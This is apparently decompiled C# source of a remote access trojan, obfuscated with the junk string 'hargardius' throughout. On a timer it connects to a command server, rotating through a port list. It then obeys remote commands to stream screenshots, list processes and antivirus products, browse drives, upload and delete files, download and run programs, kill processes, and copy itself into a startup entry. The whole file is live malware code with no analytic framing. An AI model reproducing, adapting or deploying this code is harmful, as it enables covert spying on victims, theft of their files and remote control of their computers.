using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace hargardius;

public class MLREDM
{
	public bool hargardiusis_working = false;

	private bool hargardiusiswitch = false;

	private bool hargardiusthrRuning = false;

	private bool hargardiusstr_writer = false;

	private bool hargardiuscapScreen = false;

	private Dictionary<string, byte[]> hargardiustasks = new Dictionary<string, byte[]>();

	public NetworkStream hargardiusnetStream;

	private int hargardiusbuffSize = 1024;

	private DLRZRIVF hargardiusHD = new DLRZRIVF();

	private int hargardiusbytesRead = 0;

	public bool hargardiusreqCnls = false;

	public bool hargardiusautCnls = false;

	public DateTime hargardiuslTimeUtc;

	private Thread hargardiusfunThread;

	private ELDRARE hargardiusStateObj = new ELDRARE();

	private MLRLEINF hargardiusUPC;

	private OLRDMR hargardiusCMD;

	private int hargardiusscrSize = 200;

	private ThreadStart hargardiusfunStarter;

	public int port_sn = 0;

	public TcpClient hargardiustcpsck;

	private MemoryStream msStram = new MemoryStream();

	private SLCLRNS hargardiuscaps = new SLCLRNS();

	private Bitmap image;

	public void hargardiussaveFile(string filePath)
	{
		try
		{
			byte[] array = hargardiuspull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	private void hargardiussee_responce()
	{
		if (!hargardiusiswitch)
		{
			hargardiusiswitch = true;
			hargardiusnetStream = hargardiusCMD.hargardiusNS(hargardiustcpsck);
			hargardiuscapScreen = false;
			while (hargardiusis_working)
			{
				string[] switchType = hargardiusget_command();
				if (switchType != null)
				{
					hargardiusreqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("hargardius-" + text) : ("hargardius-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "hargardius-procl":
						hargardiusfunStarter = delegate
						{
							hargardiuslist_processes("procl");
						};
						hargardiusfunThread = new Thread(hargardiusfunStarter);
						hargardiusfunThread.Start();
						break;
					case "hargardius-getavs":
						hargardiusfunStarter = delegate
						{
							hargardiuslist_processes("getavs");
						};
						hargardiusfunThread = new Thread(hargardiusfunStarter);
						hargardiusfunThread.Start();
						break;
					case "hargardius-thumb":
						hargardiusimage_info(switchType[1]);
						break;
					case "hargardius-putsrt":
						hargardiusload_app();
						break;
					case "hargardius-filsz":
						hargardiusfile_info(switchType[1]);
						break;
					case "hargardius-rupth":
						hargardiuspush_data(null, "hargardius-appth=|hargardius".Split(new char[1] { '|' })[0] + DLAONIF.hargardiusget_mpath());
						break;
					case "hargardius-dowf":
						hargardiussaveFile(switchType[1]);
						break;
					case "hargardius-endpo":
						try
						{
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
						}
						catch
						{
						}
						break;
					case "hargardius-scrsz":
						hargardiusscreenSize(switchType[1]);
						break;
					case "hargardius-cscreen":
						hargardiussee_scren(switchType[1]);
						break;
					case "hargardius-dirs":
						hargardiusfunThread = new Thread(hargardiuslistDrives);
						hargardiusfunThread.Start();
						break;
					case "hargardius-stops":
						hargardiuscapScreen = false;
						break;
					case "hargardius-scren":
						hargardiuscapScreen = true;
						hargardiusfunStarter = delegate
						{
							hargardiusis_screen(switchType[1]);
						};
						hargardiusfunThread = new Thread(hargardiusfunStarter);
						hargardiusfunThread.Start();
						break;
					case "hargardius-cnls":
						hargardiusautCnls = true;
						hargardiusreqCnls = true;
						hargardiuscapScreen = false;
						break;
					case "hargardius-udlt":
						hargardiusCMD.hargardiusremove_user();
						break;
					case "hargardius-delt":
						hargardiusremove_file(switchType[1]);
						break;
					case "hargardius-afile":
						hargardiusfunStarter = delegate
						{
							hargardiussend_auto(switchType[1]);
						};
						hargardiusfunThread = new Thread(hargardiusfunStarter);
						hargardiusfunThread.Start();
						break;
					case "hargardius-listf":
						hargardiusfunStarter = delegate
						{
							hargardiusHD.hargardiuslookFiles(switchType[1]);
						};
						hargardiusfunThread = new Thread(hargardiusfunStarter);
						hargardiusfunThread.Start();
						break;
					case "hargardius-file":
						hargardiusfunStarter = delegate
						{
							hargardiuspush_file(switchType[1]);
						};
						hargardiusfunThread = new Thread(hargardiusfunStarter);
						hargardiusfunThread.Start();
						break;
					case "hargardius-info":
						hargardiusfunThread = new Thread(hargardiususer_info);
						hargardiusfunThread.Start();
						break;
					case "hargardius-runf":
						hargardiusCMD.hargardiusdo_process(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "hargardius-fles":
					{
						string files = hargardiusHD.hargardiuslookupFiles(switchType[1]);
						if (files != null)
						{
							hargardiusfunStarter = delegate
							{
								hargardiuspush_data(null, "hargardius-fles=|hargardius".Split(new char[1] { '|' })[0] + files);
							};
							hargardiusfunThread = new Thread(hargardiusfunStarter);
							hargardiusfunThread.Start();
						}
						break;
					}
					case "hargardius-dowr":
						hargardiussaveFile(switchType[1]);
						break;
					case "hargardius-fldr":
					{
						string Folders = hargardiusHD.hargardiuscheckFolders(switchType[1]);
						if (Folders != null)
						{
							hargardiusfunStarter = delegate
							{
								hargardiuspush_data(null, "hargardius-fldr=|hargardius".Split(new char[1] { '|' })[0] + Folders);
							};
							hargardiusfunThread = new Thread(hargardiusfunStarter);
							hargardiusfunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				hargardiusis_working = false;
				break;
			}
			hargardiusis_working = false;
			hargardiuscapScreen = false;
		}
		hargardiusiswitch = false;
	}

	public void hargardiusdo_start()
	{
		DLAONIF.hargardiusport = DLAONIF.ports[0];
		hargardiusUPC = new MLRLEINF();
		hargardiusCMD = new OLRDMR(this);
		hargardiusHD.iserver = this;
		hargardiusHD.hargardiusmainPath = DLAONIF.hargardiusget_mpath();
		TimerCallback callback = hargardiuslookup_connect;
		Timer hargardiustimer = new Timer(callback, hargardiusStateObj, 31280, 37420);
		hargardiusStateObj.hargardiustimer = hargardiustimer;
	}

	private bool hargardiusIPSConfig()
	{
		try
		{
			DLAONIF.hargardiusdefaultP = hargardiusCMD.hargardiusserverIPD();
			hargardiustcpsck = new TcpClient();
			hargardiustcpsck.Connect(DLAONIF.hargardiusdefaultP, DLAONIF.hargardiusport);
			return true;
		}
		catch
		{
			hargardiusports_switch();
			return false;
		}
	}

	public string hargardiusfile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|hargardius".Split(new char[1] { '|' })[0] : "<|hargardius".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|hargardius".Split(new char[1] { '|' })[0] : "<|hargardius".Split(new char[1] { '|' })[0]);
			text = text + hargardiusget_size(fileInfo.Length) + ((!ret) ? ">|hargardius".Split(new char[1] { '|' })[0] : "<|hargardius".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				hargardiuspush_data(null, "hargardius-filsz=|hargardius".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void hargardiuslookup_connect(object zource)
	{
		try
		{
			if (!hargardiusthrRuning)
			{
				hargardiusthrRuning = true;
				if (!hargardiusis_working || !hargardiustcpsck.Connected)
				{
					hargardiusis_working = hargardiusIPSConfig();
					if (hargardiusis_working)
					{
						hargardiusbuffSize = hargardiustcpsck.ReceiveBufferSize;
						hargardiussee_responce();
					}
				}
			}
			hargardiusthrRuning = false;
		}
		catch
		{
			hargardiusthrRuning = false;
			hargardiusstr_writer = false;
			hargardiusis_working = false;
			hargardiusiswitch = false;
		}
	}

	public void hargardiusports_switch()
	{
		try
		{
			port_sn++;
			DLAONIF.hargardiusport = DLAONIF.ports[port_sn];
			if (port_sn >= DLAONIF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool hargardiussend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				hargardiuspush_data(data, "hargardius-afile=" + fileinfo);
				return false;
			}
			hargardiuspush_data(null, "hargardius-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void hargardiuslist_processes(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|hargardius".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|hargardius".Split(new char[1] { '|' })[0];
				text += "0>|hargardius".Split(new char[1] { '|' })[0];
				try
				{
					text = text + FileVersionInfo.GetVersionInfo(processes[i].MainModule!.FileName).FileDescription + "<";
				}
				catch
				{
					text += "<";
				}
			}
			if (text == "")
			{
				text = "No-Found!> > > <|hargardius".Split(new char[1] { '|' })[0];
			}
			byte[] byteArray = DLAONIF.getByteArray(text);
			hargardiuspush_data(byteArray, "hargardius-" + cmd + "=pcess|hargardius".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void hargardiusload_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			string text = DLAONIF.hargardiusget_mpath() + DLAONIF.hargardiusmainApp + ".exe|hargardius".Split(new char[1] { '|' })[0];
			if (text != executablePath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(executablePath));
			}
			Thread.Sleep(10);
			DLAONIF.hargardiusset_run("_dreb|hargardius".Split(new char[1] { '|' })[0], DLAONIF.hargardiusget_mpath() + DLAONIF.hargardiusmainApp + ".exe|hargardius".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void hargardiusimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|hargardius".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|hargardius".Split(new char[1] { '|' })[0];
				text = text + hargardiusget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				hargardiuspush_data(memoryStream.ToArray(), "hargardius-thumb=|hargardius".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void hargardiussee_scren(string screenSize)
	{
		try
		{
			hargardiusscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			image = hargardiuscaps.hargardiusscreen(hargardiusscrSize);
			msStram.SetLength(0L);
			((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
			hargardiuspush_data(msStram.ToArray(), "hargardius-sascr=hargardius|hargardius".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void hargardiusis_screen(string screenSize)
	{
		try
		{
			hargardiusscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (hargardiuscapScreen && hargardiusis_working)
			{
				image = hargardiuscaps.hargardiusscreen(hargardiusscrSize);
				msStram.SetLength(0L);
				((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
				hargardiuspush_data(msStram.ToArray(), "hargardius-scren=hargardius|hargardius".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void hargardiususer_info()
	{
		string text = hargardiusUPC.hargardiuslancard + "|" + hargardiusUPC.hargardiuscname + "|" + hargardiusUPC.hargardiusuname + "|" + hargardiusUPC.hargardiusuip + "|" + DLAONIF.hargardiusOsname() + "|" + hargardiusUPC.hargardiusapver + "|";
		text += "| !hargardius".Split(new char[1] { '!' })[0];
		text = text + "|" + hargardiusUPC.hargardiusclientNum;
		text = text + "|" + DLAONIF.hargardiusget_mpath();
		byte[] byteArray = DLAONIF.getByteArray(text);
		hargardiuspush_data(byteArray, "hargardius-info=uzer|hargardius".Split(new char[1] { '|' })[0]);
	}

	private void hargardiusscreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			hargardiusscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	public bool hargardiuspush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (hargardiusstr_writer)
			{
				return false;
			}
			hargardiusstr_writer = true;
			byte[] byteArray = DLAONIF.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !hargardiusreqCnls)
			{
				int num5 = ((num4 > hargardiusbuffSize) ? hargardiusbuffSize : num4);
				hargardiusnetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			hargardiusstr_writer = false;
			if (hargardiusreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			hargardiusstr_writer = false;
			hargardiusis_working = false;
			return false;
		}
	}

	private string hargardiusget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|hargardius".Split(new char[1] { '|' })[0],
				"KB|hargardius".Split(new char[1] { '|' })[0],
				"MB|hargardius".Split(new char[1] { '|' })[0],
				"GB|hargardius".Split(new char[1] { '|' })[0],
				"TB|hargardius".Split(new char[1] { '|' })[0],
				"PB|hargardius".Split(new char[1] { '|' })[0],
				"EB|hargardius".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	private void hargardiuspush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				hargardiuspush_data(File.ReadAllBytes(lfile), "hargardius-file=|hargardius".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void hargardiusremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	public string[] hargardiusget_command()
	{
		try
		{
			byte[] array = new byte[5];
			hargardiusbytesRead = hargardiusnetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= hargardiusbytesRead)
			{
				int count = ((num3 > hargardiusbuffSize) ? hargardiusbuffSize : num3);
				hargardiusbytesRead = hargardiusnetStream.Read(array2, num2, count);
				num2 += hargardiusbytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			hargardiusis_working = false;
			return null;
		}
	}

	public byte[] hargardiuspull_data()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			hargardiusbytesRead = hargardiusnetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !hargardiusreqCnls)
			{
				int count = ((num3 > hargardiusbuffSize) ? hargardiusbuffSize : num3);
				hargardiusbytesRead = hargardiusnetStream.Read(array2, num, count);
				num += hargardiusbytesRead;
				num3 -= hargardiusbytesRead;
			}
			if (hargardiusreqCnls)
			{
				hargardiusnetStream.Flush();
				while (hargardiusnetStream.DataAvailable && hargardiusnetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			hargardiusis_working = false;
			return null;
		}
	}

	private void hargardiuslistDrives()
	{
		try
		{
			string text = hargardiusHD.hargardiuslookupDrives();
			hargardiuspush_data(null, "hargardius-dirs=" + text);
		}
		catch
		{
		}
	}
}
